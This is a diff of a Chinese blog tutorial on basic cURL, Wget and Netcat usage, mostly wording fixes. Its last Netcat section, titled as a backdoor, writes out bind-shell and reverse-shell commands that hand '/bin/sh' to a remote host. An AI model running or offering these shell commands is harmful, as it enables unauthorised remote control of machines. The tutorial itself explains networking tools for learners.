@@ -13,17 +13,17 @@ tags:
 ![](/blog/images/17040601.jpg)
 # 0x00 前言
 
-网络调试当中经常需要一些命令行工具，其中较为著名的是cURL、Wget和Netcat三款跨平台工具。它们除了具有对网络通信进行分析之类常规功能，甚至还可以进行数据爬取、端口反弹等特殊功能，完全是居家旅行必备之良品。本文对cURL、Wget和Netcat三款工具的常见功能进行介绍，方便新手快速掌握命令的基本选项与参数。
+网络调试当中经常需要用到一些命令行工具，其中较为著名的是cURL、Wget和Netcat三款跨平台工具。它们除了具有对网络通信进行分析之类的常规功能，甚至还有数据爬取、端口反弹等特殊功能，完全是居家旅行必备之良品。本文对cURL、Wget和Netcat三款工具的常见功能进行介绍，方便新手快速掌握这里命令行工具的基本选项与参数。
 
 # 0x01 模拟请求利器cURL
-[cURL](https://curl.haxx.se/)支持的通信协议有FTP、FTPS、HTTP、HTTPS、IMAP、POP3、SMTP等。除了命令行工具，cURL还包含了用于程序开发的libcurl, 可以与许多语言想结合，如PHP、C++等。这里主要介绍cURL作为命令行工具在HTTP、HTTPS等协议中的运用。
+[cURL](https://curl.haxx.se/)支持的通信协议有FTP、FTPS、HTTP、HTTPS、IMAP、POP3、SMTP等。除了命令行工具，cURL还包含了用于程序开发的libcurl, 可以与许多语言相结合，如PHP、C++等。这里主要介绍cURL作为命令行工具在HTTP、HTTPS等协议中的运用。
 
 <!--more-->
 
 ## 查看 www.qq.com 的网页源码
     curl www.qq.com
 
-## 下载一张腾讯图片后保存到本地，并重命名logo.png
+## 下载一张图片后保存到本地，并重命名logo.png
     curl -o logo.png  http://mat1.gtimg.com/www/images/qq2012/qqlogo_1x.png
 
 ## 查看HTTPS的网页源码
@@ -35,7 +35,7 @@ tags:
 ## 重定向（3xx的HTTP状态码）的自动跳转，带-L参数
     curl -L www.sina.com
 
-## 显示通信过程（http request与http response的首部信息）
+## 显示通信过程（显示http request与http response的首部信息）
     curl -v www.baidu.com
 
 ## OPTIONS、HEAD方法
@@ -62,7 +62,7 @@ tags:
     curl -v --cookie "name=VALUE" www.baidu.com
 
 # 0x02 网络下载工具Wget
-作为最著名的命令行下载工具，Wget的名字是“World Wide Web”和“Get”的结合,支持通过HTTP、HTTPS，以及FTP这三个最常见的TCP/IP协议协议下载。
+作为最著名的命令行下载工具，Wget的名字是“World Wide Web”和“Get”的结合，它支持通过HTTP、HTTPS，以及FTP这三个最常见的TCP/IP协议协议下载。
 
 ## 下载文件后重命名保存（-O选项后的参数指定文件名）
     wget http://www.baidu.com/img/bd_logo1.png -O new.png  
@@ -86,6 +86,7 @@ tags:
 
 ## 后台下载，并将下载日志实时保存到名为wget-log文件中
     wget.exe  -b  http://dldir1.qq.com/qqfile/qq/QQ8.9.1/20453/QQ8.9.1.exe  
+    
     实时查看日志：tail -f wget-log
 
 ## 测试URL的有效性
@@ -95,7 +96,7 @@ tags:
     wget -m -p -k -H  -l 2    --execute robots=off  -P mydir http://www.pixgoo.com/
 
 # 0x03 瑞士军刀Netcat
-在网络工具中有“瑞士军刀”美誉的Netcat，可以对TCP，UDP协议进行测试。
+在网络工具中有“瑞士军刀”美誉的Netcat，可以对TCP，UDP协议进行测试，甚至可以用它对服务器进行远程控制。
 
 ## TCP测试
 服务端： 监听TCP端口8000  
@@ -116,30 +117,39 @@ tags:
 
 ## TCP测试2
     nc www.baidu.com 80
+
 nc上输入下面的文本，并回车
+
     GET / HTTP/1.1
     Host: baidu.com
+
 直接返回得到百度首页的HTML代码
 
 ## UDP测试
-服务端：
+服务端： UDP端口1234 
+
     nc -lp 1234 -u
 
 客户端：
+
     nc -u  192.168.112.2  1234
 
-## 后门
-被控端：在被控端打开端口
+## 后门，远程控制服务器
+被控端：在被控端打开端口1234
+
     nc -lp 1234 -e /bin/sh
 
 主控端:
+
     nc 192.168.112.2  1234
 
 ## 反向连接，端口反弹
-主控端： 在主控端打开端口
+主控端：在主控端打开端口1234
+
     nc -lp 1234
 
 被控端：
+
     nc  192.168.112.2 1234  -e /bin/sh
 
 
